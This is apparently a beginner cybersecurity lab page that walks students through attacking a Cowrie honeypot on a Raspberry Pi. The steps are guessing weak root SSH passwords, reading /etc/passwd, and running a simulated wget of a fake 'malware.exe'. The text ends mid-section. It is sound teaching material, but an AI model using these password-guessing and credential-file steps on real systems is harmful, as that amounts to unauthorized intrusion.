    <h1>🍯 Cowrie Honeypot: The Trap</h1>
    <p><strong>WARNING: This is not a web application.</strong> To play this challenge, you need to open the <strong>Terminal</strong> application on your Raspberry Pi desktop (the black box icon at the top of the screen).</p>
    
    <h2>🧠 The Concept</h2>
    <p>A honeypot is an "Active Defense" trap. Instead of trying to keep hackers out, cybersecurity engineers set up fake, highly vulnerable servers specifically designed to lure them in.</p>
    <p>When a hacker attacks a honeypot, they think they have successfully breached a real company. In reality, they are trapped in a fake, simulated computer system, and the security engineers are recording every single command they type to study their tactics.</p>
    
    <h2>🎯 Mission 1: Break In</h2>
    <p>Your first goal is to force your way into the server using a protocol called SSH (Secure Shell). Because this server is a trap, the administrators intentionally left a terrible password on the root (admin) account.</p>
    <ol>
        <li>Open your Terminal.</li>
        <li>Look at your main dashboard to find your specific SSH command and target IP. It will look something like this: <br><code>ssh -p 2221 root@192.168.2.10</code></li>
        <li>Type that command into the terminal and press Enter.</li>
        <li>When it asks for a password, try guessing awful, common passwords. <em>(Hint: Try <code>123456</code>, <code>admin</code>, or <code>password</code>)</em>. Note: When typing passwords in Linux, the cursor will not move. Just type it and hit Enter!</li>
    </ol>

    <h2>🎯 Mission 2: Explore the System</h2>
    <p>If you guessed the password correctly, your terminal prompt will change to <code>root@server:~#</code>. You are now "inside" the honeypot!</p>
    <p>Because there is no mouse or graphical menu, you have to navigate the computer using text commands. Try typing these real Linux commands into the terminal to see what you can find:</p>
    
    <div class="terminal-box">
        <strong>ls -la</strong><br>
        <em>(List all files: Shows you every hidden file and folder in your current directory.)</em><br><br>
        
        <strong>pwd</strong><br>
        <em>(Print Working Directory: Tells you exactly where you are located inside the server.)</em><br><br>
        
        <strong>whoami</strong><br>
        <em>(Who Am I: Asks the server what user account you are currently logged in as.)</em><br><br>
        
        <strong>cat /etc/passwd</strong><br>
        <em>(Concatenate: This forces the server to print out the master list of all user accounts registered to the machine.)</em>
    </div>

    <h2>🎯 Mission 3: The Download</h2>
    <p>Hackers often try to download malicious files once they break into a server. Try downloading a fake file from the internet using the `wget` command:</p>
    <div class="terminal-box">
        <strong>wget http://google.com/malware.exe</strong><br>
        <em>(Notice how the honeypot pretends to download the file, even though it isn't connected to the real internet!)</em>
